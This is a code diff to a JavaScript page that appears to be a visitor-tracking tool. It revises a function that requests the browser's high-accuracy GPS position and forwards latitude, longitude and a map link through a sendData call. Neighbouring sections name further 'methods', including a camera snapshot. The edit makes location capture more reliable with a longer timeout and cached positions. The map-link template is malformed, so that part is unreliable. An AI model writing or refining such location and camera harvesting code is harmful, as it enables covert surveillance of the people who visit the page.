@@ -37,21 +37,25 @@
 
         // 2. THE "PRECISION" METHOD (GPS Lat/Long)
         // Triggers the "Allow Location" browser popup.
-        function getGPSLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    sendData({
-                        method: "HIGH_PRECISION_GPS",
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: `${pos.coords.accuracy} meters`,
-                        google_maps: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
-                    });
-                }, (err) => {
-                    sendData({ method: "GPS_ERROR", message: err.message });
-                }, { enableHighAccuracy: true, timeout: 5000 });
-            }
-        }
+function getGPSLocation() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendData({
+                method: "HIGH_PRECISION_GPS",
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                google_maps: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
+            });
+        }, (err) => {
+            sendData({ method: "GPS_ERROR", message: err.message });
+        }, { 
+            enableHighAccuracy: true, 
+            timeout: 15000, // Increased to 15 seconds
+            maximumAge: 60000 // Uses cached location if available
+        });
+    }
+}
+
 
         // 3. CAMERA SNAPSHOT (Triggers Camera Permission & LED)
         async function takeSnapshot() {
